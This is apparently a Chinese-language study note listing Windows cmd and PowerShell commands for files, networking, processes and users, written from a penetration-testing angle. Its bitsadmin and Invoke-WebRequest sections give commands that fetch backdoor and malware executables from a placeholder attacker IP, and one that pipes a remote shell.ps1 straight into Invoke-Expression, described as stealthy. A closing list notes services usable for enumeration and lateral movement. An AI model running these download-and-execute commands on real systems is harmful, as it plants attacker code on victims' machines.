1.文件和目录操作
dir 查看目录下的文件，也可以dir c:\  路径含空格的需要加双引号
copy 复制文件1  只能使用绝对路径
type 显示文件内容
md 创建目录
cd 切换目录
rd 删除目录
del 删除文件
echo hello > 1.txt 向1.txt文件中写入 hello  ,会覆盖本来的文件内容
echo hello >> 1.txt   追加写入，不覆盖
​
2.系统管理命令
set  查看/设置环境变量   
echo 输出内容或者变量  echo hello  echo %PATH%
systeminfo 显示系统信息
hostname 查看主机名称
%windir% 系统环境变量 实际指向 C:\windows
%systemroot%  C:\windows
ver 查看操作系统版本
shutdown /s  关闭系统
shutdown /r 重启系统
shutdown /a  停止即将执行的关机或重启  
​
3.网络
netstat  显示协议统计信息及tcp/ip网络连接
netstat ?/ 显示命令的用法
ipconfig /all 查看ip配置
netstat -an 查看开放端口
netstat -abon 查询开放端口及其服务和id
tracert  ip  追踪到某个ip的完整的路由过程
arp -a 查看本地所有的arp缓存条目
netsh firewall show state           防火墙状态
netsh firewall show config           防火墙规则
nslookup 域名（可指定某个dns服务器查询，为空则使用本机的dns服务器）   查找主机或域名并返回ip地址
tasklist  列出正在运行的进程
tasklist /FI "imagename eq cmd.exe"    筛选某个进程
FI筛选   imagename 映象名称（进程名称？）    eq 等于   cmd.exe  指定的进程
taskkill /PID 1516  终止某个进程
​
4.用户和权限
net user  查看所有用户
net user lenovo  查看某个具体用户
whoami 显示当前用户
net localgroup 查看组
​
5.bitsadmin
一个用于传输和下载文件的系统服务

```bash
bitsadmin /transfer DownloadTool /download /priority normal http://攻击者IP/tool.exe C:\Windows\Temp\tool.exe

```
/transfer  一键创建并启动传输任务  ，无需分布执行
Downloadtool  任务名称
/download 任务类型 一种是下载download ，一种是上传upload
/priority normal  设置传输优先级 有normal high low
http://攻击者IP/tool.exe 目标服务器的地址 一般是攻击机的某个文件或脚本 
C:\Windows\Temp\tool.exe  当前所在主机的保存的地址，一般就是靶机保存脚本的地址
​
6.iwr（`**Invoke-WebRequest**`）
也是一个类似bitsadmin的工具，传输和下载文件 但是只能在powershell运行

```bash
iwr -Uri "http://攻击者IP/backdoor.exe" -OutFile "C:\Windows\Temp\backdoor.exe"  
#基础文件下载

iwr -Uri "https://攻击者IP/malware.exe" -OutFile "C:\Temp\malware.exe" -SkipCertificateCheck
#可跳过ssl证书验证

# 获取目标网页的 HTML 源码，输出到控制台
iwr -Uri "http://靶机IP:8080/index.html"
# 将网页内容保存为本地文件
iwr -Uri "http://靶机IP:8080/robots.txt" -OutFile "C:\Temp\robots.txt"

# 下载 PowerShell 脚本并立即执行（无需保存到本地，隐蔽性极强）
iwr "http://攻击者IP/shell.ps1" | Invoke-Expression


```

7.常见服务及功能作用
SMB  445/139  文件和打印机共享 远程管理   可以枚举用户/组/共享文件目录  
RPC   135/动态端口   远程过程调用 windows内部通信基础  a调用b上的函数或者服务通过RPC   可枚举用户/组
RDP 3389 远程桌面连接
LOAP  389(明文)/(加密)636   AD活动目录，存储和管理域账户信息  可枚举域用户/组/权限关系
NetBIOS 137/138/139 旧版网络名称服务（喊名字） 可泄露主机名/用户/共享等
WMI 135/动态端口  查各种信息 远程执行代码 管理系统   可枚举信息，用于横向移动等
WinRM 5985/5986  远程连接windows系统，无需桌面RDP 可执行命令管理系统，ssh
